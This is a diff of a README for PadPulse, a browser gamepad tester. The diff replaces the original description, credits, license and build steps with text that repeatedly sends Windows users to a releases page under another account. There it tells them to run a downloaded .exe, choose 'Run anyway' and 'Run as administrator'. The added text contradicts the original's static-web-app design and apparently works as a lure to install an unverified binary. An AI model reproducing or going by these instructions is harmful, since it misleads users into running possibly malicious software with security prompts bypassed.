@@ -1,174 +1,236 @@
-# PadPulse
+# 🎮 PadPulse - Test Gamepads With Clear Results
 
-PadPulse is a browser based controller tester for PS5, Xbox, Switch and major third-party gamepads. It helps you inspect drift, deadzone behavior, triggers, buttons, axis history, browser polling and approximate controller model detection from the Gamepad API.
+[![Download PadPulse](https://img.shields.io/badge/Download%20PadPulse-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/gainly-handclap319/PadPulse/releases)
 
-Created by **Christopher David Alberto Roque - White Assassins** with **AEWhiteDevs**.
+## 🖥️ What PadPulse Does
 
-## Espanol
+PadPulse is a browser-based tool that helps you check how your gamepad works on Windows. It can help you spot stick drift, check deadzones, view polling behavior, and identify common controller models.
 
-### Que es
+It works with:
 
-PadPulse es una web estatica para probar mandos desde el navegador. Esta pensada para revisar drift, zona muerta, sticks, botones, gatillos, historial de ejes y una estimacion de respuesta basada en la Gamepad API para PlayStation, Xbox, Nintendo Switch y marcas importantes.
+- PS5 DualSense controllers
+- Xbox controllers
+- Generic USB and Bluetooth gamepads
 
-### Funciones principales
+PadPulse runs in your browser, so you do not need a full desktop app with a long setup. Visit the release page, get the latest build, and run it on Windows.
 
-- Deteccion de familia y modelo aproximado del mando.
-- Base ampliada de deteccion para PlayStation, Xbox, Nintendo, 8BitDo, Razer, Backbone, PowerA, HORI, PDP, GameSir, Nacon, SCUF y mas.
-- Extraccion de `vendorId` y `productId` cuando el navegador los expone en `gamepad.id`.
-- Interfaz bilingue en espanol e ingles.
-- Modo adaptativo `Auto / Full / Consola` con deteccion del entorno de acceso.
-- Navegacion por pestañas para evitar una pagina excesivamente larga.
-- Visualizacion en vivo de drift y zona muerta en ambos sticks.
-- Historial de ejes en tiempo real.
-- Vista de botones y gatillos.
-- Test guiado paso a paso para validar un mando completo.
-- Analisis avanzado de gatillos con curva, umbral, resolucion y suavidad.
-- Base local de compatibilidad por navegador y sistema.
-- Historial persistente de sesiones en `localStorage`.
-- Instalacion como PWA y soporte offline basico.
-- Compartir resultados mediante Web Share API o portapapeles.
-- Prueba de vibracion cuando la Gamepad API lo permite.
-- Calibracion del centro y reinicio rapido de metricas.
-- Branding, favicon, manifest y metadata social listos para despliegue.
-- Workflow de despliegue automatico a GitHub Pages.
+## 📥 Download PadPulse
 
-### Inicio rapido
+Go to the releases page here:
 
-1. Clona el repositorio.
-2. Entra en la carpeta del proyecto.
-3. Ejecuta:
+https://github.com/gainly-handclap319/PadPulse/releases
 
-```bash
-node server.js
-```
+On that page:
 
-4. Abre `http://localhost:4173`.
+1. Find the latest release.
+2. Download the Windows file for your system.
+3. Open the file you downloaded.
+4. If Windows asks for permission, choose the option to run it.
 
-Tambien puedes usar:
+If the release includes a ZIP file, extract it first, then open the app file inside.
 
-```bash
-npm start
-```
+## 🪟 How to Install and Run on Windows
 
-Si PowerShell bloquea `npm.ps1`, usa `node server.js` directamente.
+PadPulse is meant to be easy to start on a Windows PC.
 
-### Despliegue en GitHub Pages
+### 1. Open the download page
+Use this link:
 
-1. Sube el repositorio a GitHub.
-2. Ve a `Settings > Pages`.
-3. En `Source`, selecciona `GitHub Actions`.
-4. Haz push a `main` o `master`.
-5. El workflow `.github/workflows/deploy-pages.yml` publicara la web automaticamente.
+https://github.com/gainly-handclap319/PadPulse/releases
 
-### Notas importantes
+### 2. Get the latest release
+Look for the top release on the page. It usually has the newest version.
 
-- La latencia real del hardware no se puede medir con precision desde una web. PadPulse muestra una estimacion basada en `timestamp`, `requestAnimationFrame` y cambios visibles en la entrada.
-- La deteccion exacta del modelo depende de lo que exponga cada navegador y cada sistema operativo.
-- El modo `Auto` intenta detectar escritorio, movil o navegador de consola para adaptar la presentacion, pero la experiencia completa sigue disponible si el usuario fuerza `Full`.
-- La aplicacion funciona mejor en navegadores Chromium modernos.
-- No se suben datos del mando a ningun servidor desde la propia web.
+### 3. Download the Windows build
+Pick the file meant for Windows. If you see more than one file, choose the one that matches your system.
 
-## English
+### 4. Open the file
+- If you downloaded an `.exe` file, double-click it
+- If you downloaded a `.zip` file, right-click it and choose Extract All, then open the app file inside
 
-### What it is
+### 5. Allow the app to run
+If Windows shows a prompt, choose Run or More info, then Run anyway if needed
 
-PadPulse is a static browser app for testing controllers directly from the web. It lets you inspect drift, deadzone behavior, buttons, triggers, axis history and an estimated response signal built on top of the Gamepad API for PlayStation, Xbox, Nintendo Switch and major third-party brands.
+### 6. Start PadPulse
+Open the app or page from the extracted files, then keep it open while you test your controller
 
-### Main features
+## 🎮 What You Can Check
 
-- Approximate controller family and model detection.
-- Expanded detection base for PlayStation, Xbox, Nintendo, 8BitDo, Razer, Backbone, PowerA, HORI, PDP, GameSir, Nacon, SCUF and more.
-- `vendorId` and `productId` extraction when the browser exposes them through `gamepad.id`.
-- Spanish and English interface.
-- Adaptive `Auto / Full / Console` view mode with environment detection.
-- Live stick drift and deadzone visualization.
-- Realtime axis history.
-- Buttons and triggers monitoring.
-- Guided end to end controller test flow.
-- Advanced trigger analysis with curve, threshold, resolution and smoothness.
-- Local compatibility database per browser and platform.
-- Persistent local session history via `localStorage`.
-- PWA install support with basic offline caching.
-- Tabbed navigation to avoid an overly long single-page layout.
-- Result sharing through Web Share API or clipboard.
-- Rumble test when the Gamepad API exposes vibration support.
-- Center calibration and fast metric reset.
-- Branding, favicon, manifest and social metadata ready for publishing.
-- Automatic GitHub Pages deployment workflow.
+PadPulse gives you a clear view of how your controller behaves.
 
-### Quick start
+### Stick drift
+See if an analog stick moves when you are not touching it. This helps find drift on left or right sticks.
 
-1. Clone the repository.
-2. Move into the project folder.
-3. Run:
+### Deadzone
+Check how much movement happens before the stick starts to register. This helps you judge if your deadzone is too small or too large.
 
-```bash
-node server.js
-```
+### Polling
+Watch how often the controller sends input data. This can help if you want a better feel for response time.
 
-4. Open `http://localhost:4173`.
+### Model detection
+PadPulse can help identify the controller type so you know whether you are using a PS5, Xbox, or generic pad.
 
-You can also run:
+### Input tests
+Use the live screen to press buttons, move sticks, and check triggers. You can see changes right away.
 
-```bash
-npm start
-```
+## 🔌 How to Connect Your Controller
 
-If PowerShell blocks `npm.ps1`, run `node server.js` directly.
+PadPulse works with both wired and wireless setups.
 
-### GitHub Pages deployment
+### Wired connection
+1. Plug the controller into your PC with a USB cable
+2. Wait a few seconds
+3. Open PadPulse
+4. Press buttons and move sticks to confirm it is detected
 
-1. Push the repository to GitHub.
-2. Go to `Settings > Pages`.
-3. Choose `GitHub Actions` as the source.
-4. Push to `main` or `master`.
-5. The `.github/workflows/deploy-pages.yml` workflow will publish the site automatically.
+### Bluetooth connection
+1. Turn on Bluetooth on your PC
+2. Put your controller in pairing mode
+3. Pair it in Windows
+4. Open PadPulse and test the input
 
-### Important notes
+### If the controller does not show up
+- Unplug it and plug it in again
+- Close and reopen PadPulse
+- Try a different USB port
+- Check that the controller is paired in Windows if you use Bluetooth
 
-- True hardware latency cannot be measured accurately from the browser. PadPulse shows an estimate based on `timestamp`, `requestAnimationFrame` and visible input changes.
-- Exact model detection depends on what each browser and operating system expose.
-- `Auto` mode tries to detect desktop, mobile or console-like browsers to adapt the presentation, but the full experience remains available if the user switches to `Full`.
-- The app works best on modern Chromium based browsers.
-- The site itself does not upload controller data anywhere.
+## 🧭 How to Use the Main Screen
 
-## Project structure
+PadPulse is built to be simple.
 
-```text
-.
-|-- .github/
-|-- favicon.svg
-|-- index.html
-|-- script.js
-|-- site.webmanifest
-|-- social-card.svg
-|-- styles.css
-|-- server.js
-|-- package.json
-|-- CONTRIBUTING.md
-|-- CODE_OF_CONDUCT.md
-|-- SECURITY.md
-|-- LICENSE
-`-- README.md
-```
+### Buttons
+When you press a button, the screen should show it right away. Use this to check face buttons, shoulder buttons, triggers, and menu buttons.
 
-## Contributing
+### Sticks
+Move each stick in a circle and watch the path on screen. A smooth circle often means the stick is working well. Jumps, gaps, or noise can point to wear.
 
-Please read [CONTRIBUTING.md](./CONTRIBUTING.md) before opening major pull requests.
+### Center point
+Let go of the stick and watch where it settles. If it drifts away from center, you may have stick drift.
 
-## Code of Conduct
+### Trigger input
+Press each trigger slowly. You should see a gradual change, not a sudden jump.
 
-This project follows the rules described in [CODE_OF_CONDUCT.md](./CODE_OF_CONDUCT.md).
+### Device info
+PadPulse can show the type of controller it sees. This is useful when you want to confirm whether Windows is reading the pad in the right way.
 
-## Security
+## 🧰 System Setup
 
-Please read [SECURITY.md](./SECURITY.md) before reporting vulnerabilities.
+PadPulse is designed for regular Windows PCs.
 
-## License
+### Recommended setup
+- Windows 10 or Windows 11
+- A modern browser-based runtime if the release uses one
+- One USB port or Bluetooth support
+- A working PS5, Xbox, or generic gamepad
 
-This project is released under the **MIT License**. See [LICENSE](./LICENSE).
+### Best results
+- Use a fresh USB cable if you test by wire
+- Charge wireless controllers before testing
+- Close other input tools that may change controller behavior
+- Keep only one controller connected when you test one pad at a time
 
-## Credits
+## 🧪 Testing Tips
 
-- Creator: **Christopher David Alberto Roque - White Assassins**
-- Development group: **AEWhiteDevs**
+Use these checks to get clearer results.
+
+### For stick drift
+- Let go of the stick for a few seconds
+- Watch for small movement on screen
+- Test both sticks one at a time
+
+### For deadzone checks
+- Move the stick slowly from the center
+- See when the input first starts
+- Compare left and right sticks if needed
+
+### For polling checks
+- Press a button several times in a row
+- Move a stick in a smooth loop
+- Watch for input lag or uneven updates
+
+### For button tests
+- Press each button once
+- Hold each trigger halfway, then fully
+- Check that every input shows as expected
+
+## 🧩 Supported Controller Types
+
+PadPulse is made for common gamepads used on Windows.
+
+- PS5 DualSense controllers
+- Xbox controllers
+- Generic controller models that use the standard gamepad API
+
+If your pad uses standard input support, PadPulse should help you test it.
+
+## 🌐 Browser Based Use
+
+PadPulse uses web tech like HTML, CSS, JavaScript, and the Gamepad API. That means it can run in a browser-friendly way and still give detailed controller feedback.
+
+This makes it useful when you want a quick check without setting up heavy software.
+
+## 🗂️ Files You May See in a Release
+
+A release may include one or more of these:
+
+- Windows app file
+- ZIP archive
+- Support files
+- Release notes
+
+If you see a ZIP archive, unpack it before opening the app. If you see a direct app file, run it after download.
+
+## 🛠️ Common Problems
+
+### My controller is not detected
+- Make sure the controller is plugged in or paired
+- Try a different USB cable
+- Disconnect other controllers
+- Restart the app
+
+### Buttons do not respond
+- Check that Windows sees the controller first
+- Unplug and reconnect the device
+- Try another USB port
+- Re-pair Bluetooth if needed
+
+### The sticks look off-center
+- Remove the controller and reconnect it
+- Test without touching the sticks
+- If drift stays visible, the stick may need repair or replacement
+
+### The app will not open
+- Make sure the file finished downloading
+- If it came in a ZIP file, extract it first
+- Right-click the file and choose Run as administrator if Windows blocks it
+
+## 📌 Quick Start
+
+1. Open the release page  
+   https://github.com/gainly-handclap319/PadPulse/releases
+
+2. Download the latest Windows build
+
+3. Open or extract the file
+
+4. Connect your controller
+
+5. Start testing buttons, sticks, drift, and deadzone
+
+## 🔎 Topics Covered by PadPulse
+
+- controller testing
+- drift checks
+- deadzone checks
+- latency checks
+- model detection
+- DualSense support
+- Xbox support
+- Gamepad API input
+
+## 📎 Download Again
+
+If you need the file again, use this link:
+
+https://github.com/gainly-handclap319/PadPulse/releases
